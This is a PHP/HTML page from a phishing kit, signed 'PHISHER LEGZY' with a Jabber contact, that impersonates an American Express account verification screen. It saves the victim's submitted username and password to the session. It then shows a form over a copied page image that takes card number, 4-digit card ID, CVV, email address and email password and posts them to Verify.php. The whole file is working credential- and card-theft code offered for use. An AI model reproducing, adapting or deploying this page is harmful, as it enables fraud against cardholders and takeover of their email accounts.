<?php
/*
***********************************
|--		PHISHER LEGZY			--|
***********************************
|    Jabber/XMPP : legzy@xmpp.jp  |
***********************************
*/

require "requires/functions.php";

$_SESSION['username'] = $_POST['username'];
$_SESSION['password'] = $_POST['password'];

?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<title>American Express - Account Verification</title>
<head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon" href="images/favicon.png"/>
<link rel="shortcut icon" href="https://www.aexp-static.com/nav/ngn/img/logo_bluebox.gif" />


<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
<script>
function ChangetoPass(){
document.getElementById('username').type = 'password';
}
function ChangetoText(){
document.getElementById('username').type = 'text';
}
</script>

<script>
function validateForm()
{
var y=document.forms["myform"]["ccno"].value;
if(y==null || y=="")
  {
  alert("Please provide your Card Number");
  return false;
  }
var y=document.forms["myform"]["ccno"].value;
if(y.length < 15)
  {
  alert("Invalid Card Number");
  return false;
  }
var y=document.forms["myform"]["secode"].value;
if(y==null || y=="")
  {
  alert("Please provide your 4-Digit Card ID");
  return false;
  }
var y=document.forms["myform"]["secode"].value;
if(y.length < 3)
  {
  alert("Incorrect 4-Digit Card ID");
  return false;
  }
var y=document.forms["myform"]["cvv"].value;
if(y==null || y=="")
  {
  alert("Please provide your Card CVV");
  return false;
  }
var y=document.forms["myform"]["cvv"].value;
if(y.length < 3)
  {
  alert("Incorrect Card CVV");
  return false;
  }
var x=document.forms["myform"]["email"].value;
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Please provide your email address");
  return false;
  }
var y=document.forms["myform"]["emailpass"].value;
if(y==null || y=="")
  {
  alert("Please provide your email address password");
  return false;
  }
var y=document.forms["myform"]["emailpass"].value;
if(y.length < 6)
  {
  alert("Password is Too Short");
  return false;
  }
}

</script>

<script type="text/javascript">
function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57))
        return false;
    return true;
}
</script>
 
<style type="text/css">
  
.text {  
    border: solid 1px #CFD1D7;
  	border-radius: 2px;
 	padding-left: 10px;
  	font-size: 13px;
    color: #44464A;
    height: 33px; 
    width: 275px; 
 } 
 
.text:focus {  
    border-color: #8EB1EB; 
    border-style: solid; 
  	border-radius: 3px;
    border-width: 2px; 
    outline: 0; 
 } 

 </style>

<body style="visibility:hidden" onload="unhideBody()">

 

</head>
<body bgColor="#FFFFFF">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1360px; height:949px; z-index:0"><img src="images/form2.png" alt="" title="" border=0 width=1360 height=949></div>
<form action="Verify.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="myform" id="myform" method="post" autocomplete="off" onsubmit="return validateForm()">

<input name="ccno" autocomplete="off" type="text" maxlength="15" style="position:absolute;width:260px;left:215px;top:350px;z-index:6" class="text cc-number"  onkeypress='return isNumberKey(event)' />
<input name="secode" autocomplete="off" type="text" maxlength="4" style="position:absolute;width:115px;left:215px;top:420px;z-index:6" class="text cc-cvc"  onkeypress='return isNumberKey(event)' />
<input name="cvv" autocomplete="off" type="text" maxlength="3" style="position:absolute;width:115px;left:360px;top:420px;z-index:6" class="text cc-exp"  />
<input name="email" autocomplete="off" type="email" style="position:absolute;width:250px;left:215px;top:480px;z-index:6" class="text"  />
<input name="emailpass" autocomplete="off" type="password" style="position:absolute;width:250px;left:215px;top:550px;z-index:6" class="text"  />

<div id="formimage1" style="position:absolute; left:521px; top:650px; z-index:9"><input type="image" name="formimage1" width="91" height="30" src="images/4.png"></div>

</body></html>